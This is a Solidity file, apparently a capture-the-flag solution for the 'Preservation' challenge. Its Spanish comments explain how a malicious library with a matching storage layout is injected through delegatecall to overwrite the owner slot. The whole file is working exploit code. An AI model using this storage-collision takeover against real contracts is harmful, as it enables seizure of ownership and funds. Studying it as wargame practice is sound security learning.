pragma solidity 0.7.3;

import "hardhat/console.sol";

interface IPreservation {
  function setFirstTime(uint _timestamp) external;
}

contract PreservationLibraryMaliciosa {
  //Replico el storage del challenge exactamente en el mismo orden.
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 


   function setTime(uint256 _time) public {
    console.log("ENTRE EN EL MALICIOSO");
    owner = tx.origin;
  }
}

contract PreservationAttacker {
  IPreservation public challenge;
  address public libraryMaliciosaAddress;

  constructor(address _challengeAddress, address _maliciosaAddress) {
    challenge = IPreservation(_challengeAddress);
    libraryMaliciosaAddress = _maliciosaAddress;
  }

  function atacar() external{
    //Primero llamo a la funcion setFirstTime con el address de mi library maliciosa convertido en uint256. Con esto logro sobreescribir el storage[0] para redirigir el próximo llamado a la funcion setFirstTime.
    // console.log(uint256(address(libraryMaliciosa.address)));
    challenge.setFirstTime(uint256(address(libraryMaliciosaAddress)));

    //Luego llamo nuevamente a la función setFirstTime, no importa con qué argumento, ya que lo único que hará la library maliciosa será sobreescribir el storage[2], donde se especifica el owner.    
    challenge.setFirstTime(1234);
  }
}